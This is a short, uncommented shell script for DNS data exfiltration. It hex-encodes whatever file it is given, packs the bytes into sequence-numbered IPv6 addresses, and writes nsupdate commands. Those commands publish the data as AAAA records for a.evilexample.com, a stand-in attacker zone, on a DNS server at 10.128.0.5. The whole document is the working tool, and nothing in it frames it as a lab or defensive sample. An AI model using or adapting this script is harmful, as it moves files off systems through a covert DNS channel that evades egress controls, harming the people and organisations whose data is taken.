#!/bin/sh
n=2000
echo server 10.128.0.5
echo zone evilexample.com
echo prereq yxrrset a.evilexample.com AAAA
echo update delete a.evilexample.com AAAA
echo send
for b in `xxd -p -c 14 $1 | sed 's/..../&:/g' | sed 's/:$//' `; do
 f=$n:$b
 f=`echo $f | sed 's/:..$/&00/'`
 f=`echo $f:0000:0000:0000:0000:0000:0000:0000:0000 | head -c39`
 echo update a.evilexample.com. 10 AAAA $f
 n=$((n+1));
done
echo send
